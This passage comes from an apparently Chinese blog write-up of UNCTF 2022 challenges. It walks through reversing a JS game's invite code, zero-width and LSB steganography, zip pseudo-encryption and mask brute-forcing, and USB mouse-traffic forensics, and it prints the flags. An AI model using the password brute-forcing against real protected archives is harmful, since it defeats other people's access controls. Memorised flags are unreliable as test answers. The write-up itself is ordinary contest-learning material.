language_">console</span>.<span class="hljs-title function_">log</span>(view.<span class="hljs-title function_">getUint8</span>(i));<br>      &#125;<br></code></pre></td></tr></table></figure><p>在控制台运行一下得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744884.png" alt="image-20221117094614598"></p><p>一个24个元素的数组view。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[68, 51, 15, 80, 93, 14, 58, 50, 88, 48, 42, 26, 13, 22, 18, 5, 2, 86, 0, 2, 0, 19, 0, 0]</span><br></code></pre></td></tr></table></figure><p>通过一点点逆向可以得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744885.png" alt="image-20221117100255512"></p><p>w3lc开头的乱码字符串，这里有点运气的成分，猜到可能是welcome to unctf2022这样的字符串，于是尝试了一下替换到game.js里面，结果确实能够得到一个类似flag的字符串（有乱码）。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">code=[<span class="hljs-number">68</span>, <span class="hljs-number">51</span>, <span class="hljs-number">15</span>, <span class="hljs-number">80</span>, <span class="hljs-number">93</span>, <span class="hljs-number">14</span>, <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">88</span>, <span class="hljs-number">48</span>, <span class="hljs-number">42</span>, <span class="hljs-number">26</span>, <span class="hljs-number">13</span>, <span class="hljs-number">22</span>, <span class="hljs-number">18</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">86</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Db</span>(<span class="hljs-params">ch,x</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br><span class="hljs-keyword">if</span> i^<span class="hljs-built_in">ord</span>(ch)==x:<br><span class="hljs-comment"># print(chr(i),end=&quot; &quot;)</span><br><span class="hljs-keyword">return</span>(<span class="hljs-built_in">chr</span>(i))<br><br>result=<span class="hljs-string">&quot;w3&quot;</span><br>invite1=<span class="hljs-string">&quot;w3 &quot;</span>   <span class="hljs-comment">#</span><br><span class="hljs-built_in">next</span>=<span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)-<span class="hljs-number">2</span>):<br><span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>x=code[i+<span class="hljs-number">2</span>]<br><span class="hljs-built_in">next</span>=Db(<span class="hljs-built_in">next</span>,x)<br>invite1+=<span class="hljs-built_in">next</span>+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(invite1)<br>invite2=<span class="hljs-string">&quot;w&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(invite1)-<span class="hljs-number">1</span>):<br><span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> invite1[i]==<span class="hljs-string">&quot; &quot;</span>:<br>c=Db(invite1[i+<span class="hljs-number">1</span>],code[i])<br>invite2+=c<br><span class="hljs-built_in">print</span>(invite2)<br>invite1=invite1.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br><span class="hljs-built_in">print</span>(invite2[i]+invite1[i],end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>得到邀请码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">w3lc0me_7o_unctf2022!!!!<br></code></pre></td></tr></table></figure><p>UNCTF{happy_2048_game_w1th_u1c7f2022~}</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744886.png" alt="image-20221117005221023"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744887.png" alt="image-20221119102713714"></p><p>解压word文档</p><p>magic_word\word\document.xml中</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744888.png" alt="image-20221112204235264"></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">The Old Man <span class="hljs-built_in">and</span> the SeaHe was an old man who fished alone <span class="hljs-keyword">in</span> a skiff <span class="hljs-keyword">in</span> the Gulf Stream ‌‌‌‌‍﻿‍‍<span class="hljs-built_in">and</span> he had gone eighty-four days‌‌‌‌‍‬﻿‬ now without taking a fish. <span class="hljs-keyword">In</span> the first forty days a boy had been <span class="hljs-keyword">with</span> him. But after forty days without a fish the boy<span class="hljs-comment">&#x27;s parents had told him that the old man was now definitely and finally salao,which ‌‌‌‌‍‬‌﻿is the worst form of unlucky, and‌‌‌‌‍﻿‍‌ the boy had gone at their orders in another boat which caught three good fish‌‌‌‌‍‬‍‬ the first week. It made the boy sad to see the old man come in each day with his‌‌‌‌‍﻿‬﻿ saking a fish. In the first forty days a boy had‌‌‌‌‍‍‍﻿ been with him. But after forty days without a fish ‌‌‌‌‍‬‍‍the boy&#x27;s parents ‌‌‌‌‌﻿‌‍had told him that the old man was now definitely‌‌‌‌‍‬‌﻿ and finally salao,which ‌‌‌‌‍‬﻿﻿is the worst form of unlucky, and the boy had gone at their orders ‌‌‌‌‍‬﻿‍in another boat which caught three good fish the first week. It made the boy sad to‌‌‌‌‍‬‍‍ see the old man come in each day with his skiff empty and he always went down to help ‌‌‌‌‍‍﻿﻿him carry either the coiled lines or the gaff and harpoon and the sail that was furled aroundthe mast. The sail was patched‌‌‌‌‍‬﻿‬ with flour sacks and, furled, it looked like the flag of permanent defeat.The old man was thin and gaunt with deep wrinkles in the back of his neck.The brown blotches of the benevolent skin cancer‌‌‌‌‍‬‍‍ the sun brings from its reflection on the tropic sea‌‌‌‌‍﻿‍﻿ were‌‌‌‌‍‍﻿﻿ on his cheeks. The blotches ran well down the sides of his face and his hands had the deep-creased scars from handling heavy fish on the cords. But none of these scars were fresh. They were as old as ‌‌‌‌‍‬‌﻿erosions in fishless desert.‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‌‬‌‌‌‌‍﻿﻿‍</span><br></code></pre></td></tr></table></figure><p>零宽字符隐写</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744889.png" alt="image-20221112204311458"></p><h2 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744890.png" alt="image-20221119102724057"></p><p>解压word文档打开document.xml</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744891.png" alt="image-20221115221505117"></p><h2 id="巨鱼-河南理工大学"><a href="#巨鱼-河南理工大学" class="headerlink" title="巨鱼-河南理工大学"></a>巨鱼-河南理工大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744892.png" alt="image-20221119102735762"></p><p>修改fish.png高度，得到压缩包密码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">无所谓我会出手<br></code></pre></td></tr></table></figure><p>修复一下伪加密压缩包，得到psss.png和flag.pptx</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744893.png" alt="image-20221115222759135"></p><p>666，压缩包密码就得到了。</p><p>解压后，CTRL+A最后一页，修改文字颜色，即可得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744894.png" alt="image-20221115223120197"></p><h2 id="清和fan-江西警察学院"><a href="#清和fan-江西警察学院" class="headerlink" title="清和fan-江西警察学院"></a>清和fan-江西警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744895.png" alt="image-20221119102748179"></p><p>通过压缩包末尾信息爆破</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744896.png" alt="image-20221116093550076"></p><p>前六个数字，掩码爆破，无果后尝试修改后面的日期，</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>_202?<span class="hljs-regexp">/0?/</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744897.png" alt="image-20221116101431145" style="zoom: 67%;"><p>整个爆破时间也只需要三四分钟</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">836885_2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">如果一个人不知道清和，说明这个人文学造诣和自我修养不足，他理解不了这种内在的阳春白雪的高雅艺术，他只能看到外表的辞藻堆砌，参不透其中深奥的精神内核，他整个人的层次就卡在这里了，只能度过一个相对失败的人生。<br>If‌‌‌‌‍﻿‍‍ a person ‌‌‌‌‍‬﻿‬<span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span>‌‌‌‌‍‬‌﻿ know Qinghe, <span class="hljs-keyword">it</span> shows ‌‌‌‌‍﻿‍‌<span class="hljs-keyword">that</span> this ‌‌‌‌‍‬‍‬person has insufficient humanistic‌‌‌‌‍﻿‬﻿ attainments <span class="hljs-keyword">and</span> self‌‌‌‌‍﻿‍﻿-cultivation. He cannot understand‌‌‌‌‍‬‬‌ this inner elegant art. He‌‌‌‌‍‬‌‍ can only see <span class="hljs-keyword">the</span> rhetoric <span class="hljs-keyword">on</span> ‌‌‌‌‌﻿‌‍<span class="hljs-keyword">the</span> outside, <span class="hljs-keyword">but</span> cannot penetrate <span class="hljs-keyword">the</span> profound spiritual core.‌‌‌‌‍‬‍‍ The human‌‌‌‌‍‍﻿﻿ level <span class="hljs-keyword">is</span> stuck here,‌‌‌‌‍﻿‍﻿ <span class="hljs-keyword">and</span> you can only live a life <span class="hljs-keyword">of</span>‌‌‌‌‍‬‌‍ relative failure.<br>Если‌‌‌‌‍‬﻿‬ человек не знает Цинхэ‌‌‌‌‍﻿‍‌, это говорит о том, что‌‌‌‌‍﻿‌﻿ у этого человека недостаточно гуманистических достижений и‌‌‌‌‍‍﻿﻿ самосовершенствования, он не может ‌‌‌‌‍‬‌‍понять этого внутреннего ‌‌‌‌‍‍﻿﻿изящного искусства, он может видеть‌‌‌‌‍‬‍﻿ только риторику снаружи, но не может проникнуть в глубокую ‌‌‌‌‍‬‬‍духовную ‌‌‌‌‍﻿‌‬суть. уровень‌‌‌‌‍‬﻿‌ застрял здесь, и вы‌‌‌‌‍‬‍‬ можете жить.‌‌‌‌‍﻿‌‬<br>人が清河‌‌‌‌‍‬‬‍を知らないとすれば、‌‌‌‌‍‬‍‍その人は人道的‌‌‌‌‍‬﻿‬な達成と自己修養が不十分であることを示しており、この内面の優雅な芸術を‌‌‌‌‍‬‍‌理解することができず、外面の‌‌‌‌‍‍﻿﻿修辞学しか‌‌‌‌‍‬﻿‌見‌‌‌‌‍‬‬‍ることができず、深遠な精神的核心を貫くことができない‌‌‌‌‍‬‬﻿.レベルはここで立ち往生‌‌‌‌‍‬‍‍しており、相対的な失敗‌‌‌‌‍‍﻿﻿の人生しか生きることができません‌‌‌‌‍‬‌‍.<br>청하를 알지‌‌‌‌‍‬﻿‌ 못하는 사람은 ‌‌‌‌‍‬‬‍인본주의와 ‌‌‌‌‍‬‌﻿자기수양이‌‌‌‌‍‬‬‍ 부족함을 나타내는‌‌‌‌‍‬‌‍ 것이며, 이 내면의 기교를 이해할 수‌‌‌‌‍﻿﻿‍ 없고, 겉으로만 수사를 볼 뿐 심오한 정신의 핵심을 꿰뚫을 수는 없다. 수준은 여기에 갇히고 상대적으로 실패한 삶을 살 수 있습니다.<br></code></pre></td></tr></table></figure><p>零宽字符隐写，在markdown的代码段里可看出不同，在线网站解一下即可得到flag。</p><h2 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744898.png" alt="image-20221119102802914"></p><p>尝试搜了几个关键词，搜password的时候有结果</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744899.png" alt="image-20221117203256227"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> U6nu2_i3_b3St<br></code></pre></td></tr></table></figure><p>输入密码解压即得flag</p><h2 id="In-the-Morse-Garden-陆军工程大学"><a href="#In-the-Morse-Garden-陆军工程大学" class="headerlink" title="In_the_Morse_Garden-陆军工程大学"></a>In_the_Morse_Garden-陆军工程大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744900.png" alt="image-20221119102813066"></p><p>pdf文件里面直接ctrl+a复制内容到记事本</p><p>得到</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=&#125;<br></code></pre></td></tr></table></figure><p>base64解密得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡<br></code></pre></td></tr></table></figure><p>依古比古–&gt;.   玛卡巴卡–&gt;-  空格—&gt;&#x2F;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.--<span class="hljs-regexp">/.-/</span>-.<span class="hljs-regexp">/..--.-/</span>.-<span class="hljs-regexp">/-./</span>..--.-<span class="hljs-regexp">/--/</span>.-<span class="hljs-regexp">/-.-/</span>.-<span class="hljs-regexp">/..--.-/</span>-...<span class="hljs-regexp">/.-/</span>-.-<span class="hljs-regexp">/.-/</span>.-<span class="hljs-regexp">/.-/</span>.-<span class="hljs-regexp">/.-/</span>-.-.--<br></code></pre></td></tr></table></figure><p>摩斯解密</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">WAN_AN_MAK<span class="hljs-built_in">A_BAKAAAAA</span>!<br></code></pre></td></tr></table></figure><p>最后套个UNCTF{}壳子</p><h2 id="zhiyin-中国人民公安大学"><a href="#zhiyin-中国人民公安大学" class="headerlink" title="zhiyin-中国人民公安大学"></a>zhiyin-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744901.png" alt="image-20221119102835298"></p><p>zhiyin.png十六进制末尾得到摩斯</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744902.png" alt="image-20221117203941580"></p><p>解密得到</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">..--.-</span> <span class="hljs-string">..-</span> -. -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">..-.</span> -<span class="hljs-string">.-.--</span> -<span class="hljs-string">.-.--</span> -<span class="hljs-string">.-.--</span><br>_unc7f!!!<br></code></pre></td></tr></table></figure><p>观察发现lanqiu.jpg的十六进制被逆置了，倒过来一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lanqiu.jpg&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    s = f.read()<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lan.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(s[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744903.png" alt="image-20221117204134878"></p><p>拼凑起来尝试一下，得到密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">G0_p1ay_unc7f!!!<br></code></pre></td></tr></table></figure><p>解开压缩包得到flag。</p><h2 id="社什么社-湖南警察学院"><a href="#社什么社-湖南警察学院" class="headerlink" title="社什么社-湖南警察学院"></a>社什么社-湖南警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744904.png" alt="image-20221119102849797"></p><p>整个文本缩小得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744905.png" alt="image-20221117204401353"></p><p>根据出题人的学校，选取湖南的旅游景点一个一个试，得到凤凰古城</p><h2 id="芝麻开门-广东海洋大学"><a href="#芝麻开门-广东海洋大学" class="headerlink" title="芝麻开门-广东海洋大学"></a>芝麻开门-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744906.png" alt="image-20221119102903457"></p><p>key.txt给出key&#x3D;key1</p><p>逐个尝试后，lsb隐写成功提取出内容</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744907.png" alt="image-20221118001308662"></p><h2 id="CatchJerry-华中科技大学（未出）"><a href="#CatchJerry-华中科技大学（未出）" class="headerlink" title="CatchJerry-华中科技大学（未出）"></a>CatchJerry-华中科技大学（未出）</h2><p>感觉快出了，不知道是差一点还是差亿点。</p><p>分离出usb.addr&#x3D;&#x3D;”2.9.1”的部分流量</p><p>tshark提取出data</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tshark</span> -r <span class="hljs-number">291</span>.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>这部分数据看着像键盘流量，但是其实是鼠标流量，用脚本处理一下，每条数据对半分，再加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>key2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br><span class="hljs-built_in">print</span>(line)<br>t=<span class="hljs-number">1</span><br>g=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line:<br><span class="hljs-keyword">if</span> t%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>g+=<span class="hljs-string">&quot;:&quot;</span><br>g+=i<br>t+=<span class="hljs-number">1</span><br><span class="hljs-comment"># print(g[13:24]+&quot;:00:00:00:00&quot;)</span><br>key2.write(g[<span class="hljs-number">1</span>:<span class="hljs-number">12</span>]+<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到的数据通过鼠标流量脚本处理下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">1</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>得到一系列坐标</p><p>gnuplot处理一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gnuplot<span class="hljs-selector-class">.exe</span> -e <span class="hljs-string">&quot;plot &#x27;xy.txt&#x27;&quot;</span> -p<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744908.png" alt="image-20221118135719345"></p><p>接着就卡住了，交上去是错的，</p><p>另一半数据处理出来的结果是乱的，补位尝试键盘流量也无果。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;TOM_JERRY_FRIENDS&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;FRIENDS_JERRY_TOM&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;FRIENDS_TOM_JERRY&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;JERRY_TOM_FRIENDS&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;MOT_YRREJ_SDNEIRF&#125;</span><br></code></pre></td></tr></table></figure><p>&lt;</p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744909.png" alt="image-20221119102951684"></p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 